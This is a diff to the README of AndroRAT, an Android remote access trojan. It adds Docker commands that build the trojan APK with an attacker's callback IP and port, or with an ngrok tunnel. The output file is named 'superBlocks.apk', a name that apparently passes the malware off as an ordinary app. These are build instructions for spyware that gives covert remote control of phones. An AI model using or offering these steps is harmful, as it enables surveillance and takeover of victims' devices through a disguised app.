@@ -33,6 +33,18 @@ AndroRAT requires Python (3.6-3.8) and JAVA 8 (or Android Studio)
 git clone https://github.com/karma9874/AndroRAT.git
 pip install -r requirements.txt
 ```
+
+#### Docker
+```
+$ docker build -t androrat
+$ docker run --mount type=bind,source="$(pwd)",target=/code androrat --build --ip <ip address> --port <port> -o superBlocks.apk
+```
+
+#### Docker with ngrok
+Assuming ./.ngrok.yml contains proper token:
+```
+$ docker run --mount type=bind,source="$(pwd)",target=/code --mount type=bind,source="$(pwd)/.ngrok.yml",target=/root/.ngrok2/ngrok.yml android --build --ngrok -o superBlocks.apk
+```
 #### Note: 
 While cloning the repository using Git bash on windows, you may get the following error:
 > error: unable to create file \<filename>: Filename too long
